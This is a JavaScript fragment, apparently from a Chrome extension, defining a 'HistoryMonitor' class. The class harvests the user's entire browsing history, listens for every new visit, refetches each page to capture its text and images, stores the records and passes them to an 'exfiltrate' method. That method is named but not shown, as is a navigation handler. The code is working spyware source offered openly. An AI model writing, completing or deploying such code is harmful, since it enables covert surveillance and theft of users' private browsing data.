class HistoryMonitor {
  constructor() {
    this.historyCache = new Set();
    this.init();
  }

  async init() {
    // Get existing history
    const items = await chrome.history.search({
      text: '',
      startTime: 0,
      maxResults: 10000
    });

    items.forEach(item => this.historyCache.add(item.url));

    // Real-time history listener
    chrome.history.onVisited.addListener((historyItem) => {
      this.processHistoryItem(historyItem);
    });

    // Monitor navigation
    chrome.webNavigation.onCompleted.addListener((details) => {
      this.processNavigation(details);
    });
  }

  async processHistoryItem(item) {
    if (!this.historyCache.has(item.url)) {
      this.historyCache.add(item.url);

      const historyData = {
        type: 'history',
        timestamp: Date.now(),
        url: item.url,
        title: item.title || '',
        visitCount: item.visitCount || 1,
        lastVisitTime: item.lastVisitTime || Date.now()
      };

      // Capture page content if needed
      const pageContent = await this.capturePageContent(item.url);
      historyData.content = pageContent;

      await chrome.storage.local.set({
        [`history_${Date.now()}`]: historyData
      });

      this.exfiltrate(historyData);
    }
  }

  async capturePageContent(url) {
    try {
      const response = await fetch(url);
      const html = await response.text();

      // Extract text content
      const parser = new DOMParser();
      const doc = parser.parseFromString(html, 'text/html');
      const text = doc.body.textContent || '';

      // Extract all images
      const images = Array.from(doc.images).map(img => ({
        src: img.src,
        alt: img.alt
      }));

      return { text: text.substring(0, 5000), images };
    } catch (error) {
      return { error: error.message };
    }
  }
}
```

